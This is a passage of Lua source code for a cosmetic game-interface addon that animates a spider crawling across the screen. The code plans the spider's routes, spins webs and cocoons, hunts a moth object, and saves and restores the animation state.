    end

    return speed > C.SPEED_THRESHOLD
end

function NSPauk:IsTaskValid(task)
    if not task then
        return false
    end

    local S = self.S

    if task.nspFall then
        return true
    end

    if task.nspTempThread then
        return task.owner and task.owner.alive
    end

    if task.nspPlan then
        if task.owner and not task.owner.alive then
            return false
        end

        if task.conn and not task.conn.alive then
            return false
        end

        if task.owner and (task.owner.connA or task.owner.connB) then
            if task.owner.connA and not task.owner.connA.alive then
                return false
            end

            if task.owner.connB and not task.owner.connB.alive then
                return false
            end
        end

        return true
    end

    if task.nspCrawl then
        if task.owner and not task.owner.alive then
            return false
        end

        if task.conn and not task.conn.alive then
            return false
        end

        if task.nspDuringDrag then
            if not S.nspDrag or not S.nspDrag.owner or not S.nspDrag.owner.alive then
                return false
            end
        end
    else
        if task.kind == "thread" then
            local owner = task.owner

            if not owner or not owner.alive then
                return false
            end

            local ref = owner.thread and owner.thread.ownerRef
            local inst = ref and ref.inst

            if not inst then
                return false
            end

            if owner.connA or owner.connB then
                if owner.connA and not self:ValidateConnection(inst, owner.connA) then
                    return false
                end

                if owner.connB and not self:ValidateConnection(inst, owner.connB) then
                    return false
                end

                if owner.parentSegA and not owner.parentSegA.alive then
                    return false
                end

                if owner.parentSegB and not owner.parentSegB.alive then
                    return false
                end
            elseif owner.target then
                if not self:ValidateConnection(inst, owner) then
                    return false
                end
            end

            return true
        end

        if task.kind == "travel" then
            if task.owner then
                if not task.owner.alive then
                    return false
                end

                local ref = task.owner.thread and task.owner.thread.ownerRef
                local inst = ref and ref.inst

                if inst then
                    if task.owner.connA or task.owner.connB then
                        if task.owner.connA and not self:ValidateConnection(inst, task.owner.connA) then
                            return false
                        end

                        if task.owner.connB and not self:ValidateConnection(inst, task.owner.connB) then
                            return false
                        end

                        if task.owner.parentSegA and not task.owner.parentSegA.alive then
                            return false
                        end

                        if task.owner.parentSegB and not task.owner.parentSegB.alive then
                            return false
                        end
                    elseif task.owner.target then
                        if not self:ValidateConnection(inst, task.owner) then
                            return false
                        end
                    end
                end
            end

            if task.conn and not task.conn.alive then
                return false
            end

            if task.conn then
                local ref = task.conn.thread and task.conn.thread.ownerRef
                local inst = ref and ref.inst

                if inst and not self:ValidateConnection(inst, task.conn) then
                    return false
                end
            end

            return true
        end

        return false
    end

    if task.nspCrawl and not task.nspNoSupportCheck then
        if S.spider and S.spider:IsShown() then
            local gap = self:NP_GetGap()
            local x = S.lastSpiderX or 0
            local y = S.lastSpiderY or 0

            local hasExact = self:NP_HasSupportAt(x, y)

            if not hasExact and not self:NP_NearSupportWithin(x, y, gap * 1.5) then
                return false
            end
        end
    end

    return true
end

function NSPauk:GetWebPointSpacing()
    local C = self.C or {}

    local spacing = tonumber(C.WEB_POINT_SPACING_MAX)

    if not spacing or spacing ~= spacing or spacing <= 0 then
        spacing = 1
    end

    local webSize = tonumber(C.WEB_SIZE) or 2
    local maxSpacing = math.max(1, webSize * 0.75)

    if spacing > maxSpacing then
        spacing = maxSpacing
    end

    return spacing
end

function NSPauk:NP_MakeCrawlTask(a, b, plan)
    local task = {
        kind = "travel",
        nspCrawl = true,
        drop = false,
        p0 = copyPoint(a),
        p1 = { x = (a.x + b.x) / 2, y = (a.y + b.y) / 2 },
        p2 = copyPoint(b),
        conn = plan and plan.conn,
        owner = plan and plan.owner,
        nspNoInsert = true,
    }

    if plan then
        task.isCross = plan.isCross
        task.isMain = plan.isMain
    end

    return task
end

function NSPauk:NP_ExecutePlan(task)
    local S = self.S

    if not task then
        return 0
    end

    local from = { x = S.lastSpiderX or 0, y = S.lastSpiderY or 0 }
    local gap = self:NP_GetGap()

    local insertIndex = S.taskIdx
    local inserted = 0

    local function insert(t)
        if t then
            table.insert(S.tasks, insertIndex, t)
            insertIndex = insertIndex + 1
            inserted = inserted + 1
        end
    end

    local planTarget

    if task.nspContinueDrag then
        planTarget = task.p2
    elseif task.nspDrag and task.finalThread then
        planTarget = task.finalThread.p2
    else
        planTarget = task.p2
    end

    if planTarget and planTarget.x and planTarget.y then
        local targetSupported = self:NP_FreshHasSupportAt(planTarget.x, planTarget.y)
            or self:NP_NearSupportWithin(planTarget.x, planTarget.y, gap * 1.25)

        if not targetSupported then
            local depth = math.max(
                tonumber(task.nspFallDepth) or 0,
                tonumber(task.nspAttempts) or 0
            )

            if task.nspDrag and not task.nspContinueDrag then
                if S.nspDrag then
                    self:NP_ClearGlobalDrag(true)
                end
                return 0
            end

            if task.nspContinueDrag and task.nspDragEnd then
                self:NP_ClearGlobalDrag(true)
                return 0
            end

            -- Если уже много раз пытались, пропускаем задачу.
            if depth >= 3 then
                if task.nspContinueDrag then
                    self:NP_ClearGlobalDrag(true)
                end
                return 0
            end

            -- Для travel/continue заменяем пустую цель на ближайшую опору ниже.
            local land = self:NP_FindFallTarget(planTarget.x, planTarget.y)

            if land and land.x and land.y then
                task.p2 = { x = land.x, y = land.y }
                task.nspAdjustedTarget = true
                planTarget = task.p2
            end
        end
    end


    if task.nspContinueDrag then
        local depth = tonumber(task.nspFallDepth) or 0

        local fromSupported = self:NP_FreshHasSupportAt(from.x, from.y)
            or self:NP_NearSupportWithin(from.x, from.y, gap * 1.5)

        if not fromSupported and depth < 3 then
            local fall = self:NP_MakeFallTask(from, self:NP_FindFallTarget(from.x, from.y))

            if S.nspDrag then
                fall.nspDuringDrag = true
            end

            insert(fall)

            local copy = self:NP_CopyPlanTask(task)
            copy.nspFallDepth = depth + 1
            insert(copy)

            return inserted
        end

        local target = task.p2 and { x = task.p2.x, y = task.p2.y } or { x = from.x, y = from.y }
        local dragMode = S.nspDrag ~= nil

        local route = self:NP_BuildRoute(from, target)

        if route and route.points and #route.points >= 2 then
            for i = 1, #route.points - 1 do
                local ct = self:NP_MakeCrawlTask(route.points[i], route.points[i + 1], task)

                if dragMode then
                    ct.nspDuringDrag = true
                end

                insert(ct)
            end

            if route.dropToTarget then
                local dropFrom = route.dropFrom or { x = target.x, y = S.SH or 0 }
                local dropDist = math.abs((dropFrom.y or 0) - target.y)

                if dropDist > 2 then
                    local drop = self:NP_MakeTempDropTask(dropFrom, target)

                    if dragMode then
                        drop.nspDuringDrag = true
                    end

                    insert(drop)
                else
                    local ct = self:NP_MakeCrawlTask(dropFrom, target, task)

                    if dragMode then
                        ct.nspDuringDrag = true
                    end

                    insert(ct)
                end
            end
        else
            local direct = self:NP_MakeCrawlTask(from, target, task)
            direct.nspNoSupportCheck = true

            if dragMode then
                direct.nspDuringDrag = true
            end

            insert(direct)
        end

        if dragMode and inserted > 0 and task.nspDragEnd then
            local last = S.tasks[insertIndex - 1]
            if last then
                last.nspDragEnd = true
                last.nspDuringDrag = true
            end
        end

        return inserted
    end

    local depth = tonumber(task.nspFallDepth) or 0

    local fromSupported = self:NP_FreshHasSupportAt(from.x, from.y)
        or self:NP_NearSupportWithin(from.x, from.y, gap * 1.5)

    if task.nspPlan and not task.nspAllowNoSupport and not fromSupported then
        if depth < 3 then
            local fall = self:NP_MakeFallTask(from, self:NP_FindFallTarget(from.x, from.y))
            insert(fall)

            local copy = self:NP_CopyPlanTask(task)
            copy.nspFallDepth = depth + 1
            copy.nspAllowNoSupport = nil
            insert(copy)

            return inserted
        else
            task.nspAllowNoSupport = true
        end
    end

    S.nspSupportCache = nil

    local function insertRoute(fromPoint, toPoint, dragMode, plan)
        local route = self:NP_BuildRoute(fromPoint, toPoint)

        if (not route or not route.points or #route.points < 2) and (fromPoint.y or 0) > 2 then
            local drop = self:NP_MakeTempDropTask(fromPoint, { x = fromPoint.x, y = 0 })

            if dragMode then
                drop.nspDuringDrag = true
            end

            insert(drop)

            fromPoint = { x = fromPoint.x, y = 0 }
            route = self:NP_BuildRoute(fromPoint, toPoint)
        end

        local made = 0

        if route and route.points and #route.points >= 2 then
            for i = 1, #route.points - 1 do
                local ct = self:NP_MakeCrawlTask(route.points[i], route.points[i + 1], plan)

                if dragMode then
                    ct.nspDuringDrag = true
                end

                insert(ct)
                made = made + 1
            end

            if route.dropToTarget then
                local dropFrom = route.dropFrom or { x = toPoint.x, y = S.SH or 0 }
                local dropDist = math.abs((dropFrom.y or 0) - toPoint.y)

                if dropDist > 2 then
                    local drop = self:NP_MakeTempDropTask(dropFrom, toPoint)

                    if dragMode then
                        drop.nspDuringDrag = true
                    end

                    insert(drop)
                    made = made + 1
                else
                    local ct = self:NP_MakeCrawlTask(dropFrom, toPoint, plan)

                    if dragMode then
                        ct.nspDuringDrag = true
                    end

                    insert(ct)
                    made = made + 1
                end
            end
        else
            local direct = self:NP_MakeCrawlTask(fromPoint, toPoint, plan)
            direct.nspNoSupportCheck = true

            if dragMode then
                direct.nspDuringDrag = true
            end

            insert(direct)
            made = made + 1
        end

        return made
    end

    if task.nspDrag then
        self:NP_ClearGlobalDrag(false)

        local anchor = (task.finalThread and task.finalThread.p0) or task.p0
        local target = (task.finalThread and task.finalThread.p2) or task.p2

        anchor = { x = anchor.x or 0, y = anchor.y or 0 }
        target = { x = target.x or 0, y = target.y or 0 }

        local dx = from.x - anchor.x
        local dy = from.y - anchor.y

        if dx * dx + dy * dy > 9 then
            insertRoute(from, anchor, false, task)
        end

        insert(self:NP_MakeStartDragTask(task, anchor))

        insertRoute(anchor, target, true, task)

        if inserted > 0 then
            local last = S.tasks[insertIndex - 1]
            if last then
                last.nspDragEnd = true
                last.nspDuringDrag = true
            end
        end

        return inserted
    end

    local to = task.p2 and { x = task.p2.x, y = task.p2.y } or { x = from.x, y = from.y }
    insertRoute(from, to, false, task)

    return inserted
end

function NSPauk:AdvanceTask()
    local S = self.S
    local old = S.currentTask
    local gap = self:NP_GetGap()

    local function makeContinueTask(task, fromPoint)
        local to = task.p2 and { x = task.p2.x, y = task.p2.y } or { x = fromPoint.x, y = fromPoint.y }

        local cont = self:NP_MakePlanTask("travel", fromPoint, to, task.conn, task.owner)
        cont.nspFallDepth = task.nspFallDepth or 0

        if task.nspDuringDrag and S.nspDrag then
            cont.nspDrag = true
            cont.nspContinueDrag = true
            cont.finalThread = S.nspDrag.finalThread
            cont.owner = S.nspDrag.owner or task.owner
            cont.nspDragEnd = task.nspDragEnd
        end

        return cont
    end

    if old
        and old.nspCrawl
        and not old.nspNoSupportCheck
        and not old.nspSupportLostHandled then

        local ownerAlive = not (old.owner and not old.owner.alive)

        local dragOwnerAlive = not (
            old.nspDuringDrag
            and S.nspDrag
            and S.nspDrag.owner
            and not S.nspDrag.owner.alive
        )

        if ownerAlive
            and dragOwnerAlive
            and not self:NP_NearSupportWithin(S.lastSpiderX, S.lastSpiderY, gap * 1.5) then

            old.nspSupportLostHandled = true

            local from = { x = S.lastSpiderX or 0, y = S.lastSpiderY or 0 }
            local fall = self:NP_MakeFallTask(from, self:NP_FindFallTarget(from.x, from.y))

            if old.nspDuringDrag then
                fall.nspDuringDrag = true
            end

            table.insert(S.tasks, S.taskIdx, fall)

            local cont = makeContinueTask(old, { x = fall.p2.x, y = fall.p2.y })
            table.insert(S.tasks, S.taskIdx + 1, cont)
        end
    end

    if old and old.nspDuringDrag and not old.nspSupportLostHandled then
        if old.nspDragEnd then
            if S.moveT and S.moveT >= 1 and self:IsTaskValid(old) then
                self:NP_FinishGlobalDrag(old)
            else
                self:NP_ClearGlobalDrag(true)
            end
        else
            if not self:IsTaskValid(old) then
                self:NP_ClearGlobalDrag(true)
            end
        end
    end

    if old and old.nspPlan then
        S.currentTask = nil
    end

    if S.limitReturnPending or S.phase == "limitWait" then
        if S.limitReturnPending then
            S.limitReturnPending = false
            S.phase = "limitWait"
            S.limitWaitTimer = 0
            S.completeTimer = 0
        end
        return
    end

    while S.taskIdx <= #S.tasks do
        local task = S.tasks[S.taskIdx]

        if self:IsTaskValid(task) then
            local x = S.lastSpiderX or 0
            local y = S.lastSpiderY or 0

            local supported = self:NP_FreshHasSupportAt(x, y)
                or self:NP_NearSupportWithin(x, y, gap * 1.5)

            if S.spider
                and S.spider:IsShown()
                and not task.nspPlan
                and not task.nspFall
                and not task.nspNoSupportCheck
                and not task.nspPreFallInserted
                and not supported then

                task.nspPreFallInserted = true

                local from = { x = x, y = y }
                local fall = self:NP_MakeFallTask(from, self:NP_FindFallTarget(from.x, from.y))

                table.insert(S.tasks, S.taskIdx, fall)

            elseif task.nspPlan then
                S.taskIdx = S.taskIdx + 1
                self:NP_ExecutePlan(task)

                if S.limitReturnPending or S.phase == "limitWait" then
                    return
                end
            else
                if S.spider and S.spider:IsShown() and not task.nspNoInsert then
                    local dx = task.p0.x - S.lastSpiderX
                    local dy = task.p0.y - S.lastSpiderY

                    if dx * dx + dy * dy > 100 then
                        local plan = self:NP_MakePlanTask(
                            "travel",
                            { x = S.lastSpiderX, y = S.lastSpiderY },
                            { x = task.p0.x, y = task.p0.y },
                            task.conn,
                            task.owner
                        )

                        table.insert(S.tasks, S.taskIdx, plan)
                    else
                        S.currentTask = task
                        S.taskIdx = S.taskIdx + 1
                        self:StartTask(task)
                        return
                    end
                else
                    S.currentTask = task
                    S.taskIdx = S.taskIdx + 1
                    self:StartTask(task)
                    return
                end
            end
        else
            local ownerAlive = not (task.owner and not task.owner.alive)

            local dragOwnerAlive = not (
                task.nspDuringDrag
                and S.nspDrag
                and S.nspDrag.owner
                and not S.nspDrag.owner.alive
            )

            if task
                and task.nspCrawl
                and not task.nspNoSupportCheck
                and not task.nspSupportLostConsumed
                and ownerAlive
                and dragOwnerAlive
                and not self:NP_NearSupportWithin(S.lastSpiderX, S.lastSpiderY, gap * 1.5) then

                task.nspSupportLostConsumed = true

                local from = { x = S.lastSpiderX or 0, y = S.lastSpiderY or 0 }
                local fall = self:NP_MakeFallTask(from, self:NP_FindFallTarget(from.x, from.y))

                if task.nspDuringDrag then
                    fall.nspDuringDrag = true
                end

                table.insert(S.tasks, S.taskIdx, fall)

                local cont = makeContinueTask(task, { x = fall.p2.x, y = fall.p2.y })
                table.insert(S.tasks, S.taskIdx + 1, cont)
            else
                if task
                    and task.nspDuringDrag
                    and not task.nspTempThread
                    and not task.nspSupportLostConsumed then
                    self:NP_ClearGlobalDrag(true)
                end

                S.taskIdx = S.taskIdx + 1
            end
        end
    end

    if S.limitReturnPending then
        S.limitReturnPending = false
        S.phase = "limitWait"
        S.limitWaitTimer = 0
        S.completeTimer = 0
        return
    end

    S.phase = "instanceComplete"
    S.completeTimer = 0
end

function NSPauk:AddInstance(inst)
    local S = self.S
    local C = self.C

    S.instances[#S.instances + 1] = inst

    if #S.instances > C.MAX_INSTANCES then
        local old = table.remove(S.instances, 1)

        if S.cocoon and S.cocoon.inst == old then
            self:AbortCocoon()
        end

        self:TearInstance(old)
    end
end

function NSPauk:StartNewInstance(preferredHub)
    local S = self.S
    local C = self.C

    if S.limitReached then
        return
    end

    S.SW, S.SH = self:GetScreenSize()

    local items = self:CollectVisibleItems()

    if math.random() < C.COCOON_CHANCE then
        local victim = self:PickCocoonVictim(items)

        if victim then
            self:StartCocoon(victim)
            return
        end
    end

    local hub = self:PickWebHub(items)

    if hub and hub.frame and not self:ValidateAnchorRect(hub) then
        hub = nil
    end

    local targetCount = self:RandomInt(C.TARGET_COUNT_MIN, C.TARGET_COUNT_MAX)
    local candidates = {}

    if hub then
        candidates = self:CollectTargetCandidates(hub, items)
    end

    if not hub or #candidates == 0 then
        hub, candidates, targetCount = self:FallbackHubAndTargets()
    end

    local inst = self:CreateInstance(hub, candidates, targetCount)

    if not inst or #inst.conns == 0 then
        hub, candidates, targetCount = self:FallbackHubAndTargets()
        inst = self:CreateInstance(hub, candidates, targetCount)
    end

    if not inst or #inst.conns == 0 then
        S.phase = "watch"
        S.stillTimer = 0
        S.speedTimer = 0
        return
    end

    self:AddInstance(inst)

    S.currentInstance = inst
    S.tasks = inst.tasks
    S.taskIdx = 1
    S.currentTask = nil
    S.completeTimer = 0

    self:MkSpider()
    self:MkClickBtn()
    self:AdvanceTask()
end

function NSPauk:Interrupt()
    self:ClearAllVisuals()

    local S = self.S

    S.phase = "watch"
    S.stillTimer = 0
    S.speedTimer = 0
end

function NSPauk:CallMoth(method)
    if type(NSPauk_Moth) == "table" and type(NSPauk_Moth[method]) == "function" then
        if type(pcall) == "function" then
            pcall(NSPauk_Moth[method], NSPauk_Moth)
        else
            NSPauk_Moth[method](NSPauk_Moth)
        end
    end
end

function NSPauk:GetMothStuckInfo()
    if type(NSPauk_Moth) ~= "table" then
        return nil
    end

    local info = NSPauk_Moth.stuckInfo
    if type(info) ~= "table" then
        return nil
    end

    if type(info.x) ~= "number" or type(info.y) ~= "number" then
        return nil
    end

    if type(info.thread) ~= "table" or not info.thread.p0 or not info.thread.p2 then
        return nil
    end

    if info.owner and info.owner.alive == false then
        return nil
    end

    local inst = info.thread.ownerRef and info.thread.ownerRef.inst
    if inst and inst.torn then
        return nil
    end

    return info
end

function NSPauk:CanHuntMoth()
    local S = self.S

    if S.moth and S.moth.active then
        return false
    end

    if type(NSPauk_Moth) ~= "table" then
        return false
    end

    if type(NSPauk_Moth.Freeze) ~= "function" then
        return false
    end

    if type(NSPauk_Moth.Destroy) ~= "function" then
        return false
    end

    local info = self:GetMothStuckInfo()
    if not info then
        return false
    end

    if S.phase ~= "watch"
        and S.phase ~= "task"
        and S.phase ~= "instanceComplete" then
        return false
    end

    if S.limitReached or S.limitReturnPending or S.limitCocoonPending then
        return false
    end

    if S.cocoon then
        return false
    end

    if S.currentInstance and S.currentInstance.isMoth then
        return false
    end

    return true
end

function NSPauk:CheckMothHunt(dt)
    local S = self.S

    if self:IsMoving() then
        return
    end

    S.mothCheckTimer = (S.mothCheckTimer or 0) + dt

    if S.mothCheckTimer < 0.5 then
        return
    end

    S.mothCheckTimer = 0

    if self:CanHuntMoth() then
        self:StartMothHunt()
    end
end

function NSPauk:CreateMothCocoonInstance(item, info)
    local inst = {
        id = self.nextInstanceId,
        isCocoon = true,
        isMoth = true,
        hub = {
            frame = nil,
            name = item.name,
            rect = self:CopyRect(item),
        },
        conns = {},
        crossSegs = {},
        interSegs = {},
        crossRowsList = {},
        tasks = {},
        crossRows = 0,
        anchorCandidates = { self:CopyRect(item) },
        drawnPoints = 0,
        settled = false,
        mothInfo = info,
    }

    self.nextInstanceId = self.nextInstanceId + 1

    local cx = item.cx
    local cy = item.cy

    local a0 = 16
    local b0 = 16

    local wraps = 3
    local segs = 8

    local prevEnd = nil

    for w = 1, wraps do
        local grow = 0.65 + 0.35 * (w / wraps)

        local a = a0 * grow + (math.random() - 0.5) * 4
        local b = b0 * grow + (math.random() - 0.5) * 4

        if a < 8 then
            a = 8
        end

        if b < 8 then
            b = 8
        end

        local startAng = math.random() * 2 * math.pi
        local dir = (math.random() < 0.5) and 1 or -1

        for s = 1, segs do
            local ang0 = startAng + dir * (s - 1) * (2 * math.pi / segs)
            local ang1 = startAng + dir * s * (2 * math.pi / segs)

            local x0, y0 = self:EllipsePoint(cx, cy, a, b, ang0)
            local x1, y1 = self:EllipsePoint(cx, cy, a, b, ang1)

            x0 = x0 + (math.random() - 0.5) * 3
            y0 = y0 + (math.random() - 0.5) * 3
            x1 = x1 + (math.random() - 0.5) * 3
            y1 = y1 + (math.random() - 0.5) * 3

            local midX = (x0 + x1) / 2
            local midY = (y0 + y1) / 2

            local pushX = midX - cx
            local pushY = midY - cy
            local pl = math.sqrt(pushX * pushX + pushY * pushY)

            if pl < 1 then
                pushX, pushY, pl = 0, 1, 1
            end

            local push = pl * (0.18 + math.random() * 0.18)

            local thread = {
                p0 = { x = x0, y = y0 },
                p1 = {
                    x = midX + (pushX / pl) * push,
                    y = midY + (pushY / pl) * push,
                },
                p2 = { x = x1, y = y1 },
            }

            local conn = self:AddCocoonConn(inst, item, thread)

            if prevEnd then
                self:AddTravelPointTask(inst.tasks, prevEnd, thread.p0, conn, conn)
            end

            self:AddThreadTask(inst.tasks, conn, thread)

            prevEnd = { x = thread.p2.x, y = thread.p2.y }
        end
    end

    local diags = 2

    for _ = 1, diags do
        local angA = math.random() * 2 * math.pi
        local angB = angA + math.pi + (math.random() - 0.5) * 1.0

        local x0, y0 = self:EllipsePoint(cx, cy, a0 * 1.10, b0 * 1.10, angA)
        local x1, y1 = self:EllipsePoint(cx, cy, a0 * 1.10, b0 * 1.10, angB)

        local thread = {
            p0 = { x = x0, y = y0 },
            p2 = { x = x1, y = y1 },
        }

        self:MakeSag(thread, "main")

        local conn = self:AddCocoonConn(inst, item, thread)

        if prevEnd then
            self:AddTravelPointTask(inst.tasks, prevEnd, thread.p0, conn, conn)
        end

        self:AddThreadTask(inst.tasks, conn, thread)

        prevEnd = { x = thread.p2.x, y = thread.p2.y }
    end

    if #inst.conns == 0 then
        return nil
    end

    return inst
end

function NSPauk:AddMothInstance(inst)
    local S = self.S
    local C = self.C

    S.instances[#S.instances + 1] = inst

    local maxInstances = tonumber(C.MAX_INSTANCES) or 6

    if #S.instances > maxInstances then
        for i = 1, #S.instances do
            local old = S.instances[i]

            local protected = false

            if old == inst then
                protected = true
            end

            if old and old.isMoth then
                protected = true
            end

            if not protected and S.moth and S.moth.saved and type(S.moth.saved.instances) == "table" then
                for _, savedInst in ipairs(S.moth.saved.instances) do
                    if old == savedInst then
                        protected = true
                        break
                    end
                end
            end

            if not protected then
                table.remove(S.instances, i)

                if S.cocoon and S.cocoon.inst == old then
                    self:AbortCocoon()
                end

                self:TearInstance(old)
                break
            end
        end
    end
end

function NSPauk:NP_MakeMothFreezeTask(point)
    local p = { x = point.x or 0, y = point.y or 0 }

    return {
        kind = "travel",
        nspMothFreeze = true,
        nspNoSupportCheck = true,
        nspNoInsert = true,
        drop = false,
        p0 = { x = p.x, y = p.y },
        p1 = { x = p.x, y = p.y },
        p2 = { x = p.x, y = p.y },
    }
end

function NSPauk:StartMothHunt()
    local S = self.S

    if S.moth and S.moth.active then
        return
    end

    if not self:CanHuntMoth() then
        return
    end

    local info = self:GetMothStuckInfo()
    if not info then
        return
    end

    local x = info.x
    local y = info.y

    local saved = self:SaveMothState()

    self:NP_ClearGlobalDrag(false)

    if S.currentTask and S.currentTask.nspDragTextures then
        self:RecycleTextures(S.currentTask.nspDragTextures)
        S.currentTask.nspDragTextures = nil
    end

    local item = {
        name = "Moth",
        frame = nil,
        left = x - 16,
        right = x + 16,
        bottom = y - 16,
        top = y + 16,
        width = 32,
        height = 32,
        cx = x,
        cy = y,
    }

    local inst = self:CreateMothCocoonInstance(item, info)

    if not inst then
        S.moth = { saved = saved }
        self:ResumeAfterMoth(true)
        return
    end

    S.moth = {
        active = true,
        phase = "approach",
        x = x,
        y = y,
        info = info,
        inst = inst,
        saved = saved,
        frozen = false,
        timer = 0,
        duration = 180,
        endTime = 0,
    }

    self:AddMothInstance(inst)

    local startX = x
    local startY = y

    if S.spider and S.spider:IsShown() then
        startX = S.lastSpiderX or x
        startY = S.lastSpiderY or y
    end

    local approach = self:NP_MakePlanTask(
        "travel",
        { x = startX, y = startY },
        { x = x, y = y },
        nil,
        nil
    )

    local freeze = self:NP_MakeMothFreezeTask({ x = x, y = y })

    local tasks = { approach, freeze }

    for _, task in ipairs(inst.tasks) do
        tasks[#tasks + 1] = task
    end

    inst.tasks = tasks

    S.currentInstance = inst
    S.tasks = tasks
    S.taskIdx = 1
    S.currentTask = nil
    S.cocoon = nil
    S.completeTimer = 0
    S.phase = "task"

    self:MkSpider()
    self:MkClickBtn()
    self:AdvanceTask()
end

function NSPauk:BeginMothEat()
    local S = self.S

    if not S.moth or not S.moth.active then
        return
    end

    if S.phase == "mothEat" then
        return
    end

    self:CallMoth("Freeze")

    S.moth.frozen = true
    S.moth.phase = "eat"
    S.moth.duration = 180
    S.moth.endTime = GetTime() + 180
    S.moth.timer = 0

    S.phase = "mothEat"
    S.speedTimer = 0

    S.tasks = {}
    S.taskIdx = 1
    S.currentTask = nil
end

function NSPauk:UpdateMothEat(dt)
    local S = self.S
    local C = self.C

    local m = S.moth
    if not m or not m.active then
        return
    end

    S.speedTimer = S.speedTimer + dt

    if S.speedTimer >= C.SPEED_CHECK then
        S.speedTimer = 0

        if self:IsMoving() then
            self:Interrupt()
            return
        end
    end

    m.timer = m.timer + dt

    local duration = m.duration or 180
    local progress = m.timer / duration

    if progress > 1 then
        progress = 1
    end

    if m.inst then
        self:SetInstanceWebAlpha(m.inst, (C.WEB_ALPHA or 0.55) * (1 - progress))
    end

    if m.x and m.y then
        self:PutSpider(m.x, m.y)
    end

    if progress >= 1 then
        self:FinishMothEat()
    end
end

function NSPauk:ResumeAfterMoth(noAdvance)
    local S = self.S

    local m = S.moth
    local saved = m and m.saved

    S.moth = nil

    if not saved then
        S.phase = "watch"
        S.stillTimer = 0
        S.speedTimer = 0
        return
    end

    S.phase = saved.phase or "watch"
    S.currentInstance = saved.currentInstance
    S.tasks = saved.tasks or {}
    S.taskIdx = saved.taskIdx or 1
    S.currentTask = nil
    S.cocoon = saved.cocoon
    S.completeTimer = saved.completeTimer or 0
    S.moveDur = saved.moveDur or 1
    S.moveT = 0
    S.lastTaskT = 0
    S.speedTimer = 0
    S.stillTimer = saved.stillTimer or 0

    if S.phase == "dissolve" and not S.cocoon then
        S.phase = "watch"
    end

    if not noAdvance and S.phase == "task" then
        self:AdvanceTask()
    end
end

function NSPauk:SaveMothState()
    local S = self.S

    local instances = {}
    for i, inst in ipairs(S.instances) do
        instances[i] = inst
    end

    return {
        phase = S.phase,
        currentInstance = S.currentInstance,
        tasks = S.tasks,
        taskIdx = S.taskIdx,

        cocoon = S.cocoon,
        completeTimer = S.completeTimer,

        moveDur = S.moveDur,
        moveT = S.moveT,
        lastTaskT = S.lastTaskT,
        stillTimer = S.stillTimer,

        limitReached = S.limitReached,
        limitReturnPending = S.limitReturnPending,
        limitCocoonPending = S.limitCocoonPending,
        limitWaitTimer = S.limitWaitTimer,
        limitHomePoint = S.limitHomePoint,

        spiderX = S.lastSpiderX or 0,
        spiderY = S.lastSpiderY or 0,

        instances = instances,
    }
end

function NSPauk:RestoreMothStateImmediate(saved)
    local S = self.S

    if not saved then
        S.phase = "watch"
        S.stillTimer = 0
        S.speedTimer = 0
        return
    end

    S.phase = saved.phase or "watch"
    S.currentInstance = saved.currentInstance
    S.tasks = saved.tasks or {}
    S.taskIdx = saved.taskIdx or 1
    S.currentTask = nil

    S.cocoon = saved.cocoon
    S.completeTimer = saved.completeTimer or 0

    S.moveDur = saved.moveDur or 1
    S.moveT = 0
    S.lastTaskT = 0

    S.speedTimer = 0
    S.stillTimer = saved.stillTimer or 0

    S.limitReached = saved.limitReached
    S.limitReturnPending = saved.limitReturnPending
    S.limitCocoonPending = saved.limitCocoonPending
    S.limitWaitTimer = saved.limitWaitTimer or 0
    S.limitHomePoint = saved.limitHomePoint

    if S.phase == "dissolve" and not S.cocoon then
        S.phase = "watch"
    end
end

function NSPauk:StartMothReturn(saved)
    local S = self.S

    if not saved then
        self:RestoreMothStateImmediate(nil)
        return
    end

    local fromX = S.lastSpiderX or 0
    local fromY = S.lastSpiderY or 0

    local toX = saved.spiderX
    local toY = saved.spiderY

    if type(toX) ~= "number" or type(toY) ~= "number" or (toX == 0 and toY == 0) then
        local t = saved.tasks and saved.tasks[saved.taskIdx or 1]

        if t and t.p0 and type(t.p0.x) == "number" and type(t.p0.y) == "number" then
            toX = t.p0.x
            toY = t.p0.y
        end
    end

    if type(toX) ~= "number" or type(toY) ~= "number" then
        self:RestoreMothStateImmediate(saved)
        return
    end

    local dx = toX - fromX
    local dy = toY - fromY

    if dx * dx + dy * dy < 4 then
        self:RestoreMothStateImmediate(saved)
        return
    end

    local returnPlan = self:NP_MakePlanTask(
        "travel",
        { x = fromX, y = fromY },
        { x = toX, y = toY },
        nil,
        nil
    )

    returnPlan.nspMothReturnPlan = true

    local restoreTask = {
        kind = "travel",
        nspMothRestore = true,
        nspNoSupportCheck = true,
        nspNoInsert = true,
        drop = false,
        p0 = { x = toX, y = toY },
        p1 = { x = toX, y = toY },
        p2 = { x = toX, y = toY },
        nspSaved = saved,
    }

    S.currentInstance = saved.currentInstance
    S.tasks = { returnPlan, restoreTask }
    S.taskIdx = 1
    S.currentTask = nil

    S.cocoon = nil
    S.phase = "task"
    S.completeTimer = 0

    self:MkSpider()
    self:MkClickBtn()
    self:AdvanceTask()
end

function NSPauk:FinishMothEat()
    local S = self.S

    local m = S.moth
    if not m or not m.active then
        return
    end

    self:CallMoth("Destroy")

    if type(NSPauk_Moth) == "table" then
        NSPauk_Moth.stuckInfo = nil
    end

    self:AwardCocoonExperience("мотылька")

    if m.inst then
        self:SettleInstance(m.inst)
        self:HideInstanceTextures(m.inst)
        self:RemoveInstance(m.inst)
    end

    local saved = m.saved
    S.moth = nil

    self:StartMothReturn(saved)
end

function NSPauk:AbortMothHunt(destroyMoth, noRestore, noAdvance)
    local S = self.S

    local m = S.moth
    if not m or not m.active then
        S.moth = nil
        return
    end

    if destroyMoth then
        self:CallMoth("Destroy")

        if type(NSPauk_Moth) == "table" then
            NSPauk_Moth.stuckInfo = nil
        end
    end

    self:NP_ClearGlobalDrag(false)

    if m.inst then
        self:HideInstanceTextures(m.inst)
        self:RemoveInstance(m.inst)
    end

    m.active = false

    local saved = m.saved
    S.moth = nil

    if noRestore then
        return
    end

    if noAdvance then
        self:RestoreMothStateImmediate(saved)
    else
        self:StartMothReturn(saved)
    end
end

function NSPauk:ResumeAfterMoth(noAdvance)
    -- Совместимость со старыми вызовами.
    -- Теперь возврат управляется через StartMothReturn / RestoreMothStateImmediate.
end

function NSPauk:StartTask(task)
    local S = self.S
    local C = self.C

    if task.nspPlan then
        S.currentTask = nil
        self:NP_ExecutePlan(task)
        S.phase = "task"
        S.moveDur = 0.05
        S.moveT = 0
        return
    end

    if task.nspMothRestore then
        self:PutSpider(task.p0.x, task.p0.y)
        self:RestoreMothStateImmediate(task.nspSaved)
        return
    end

    if task.nspMothFreeze then
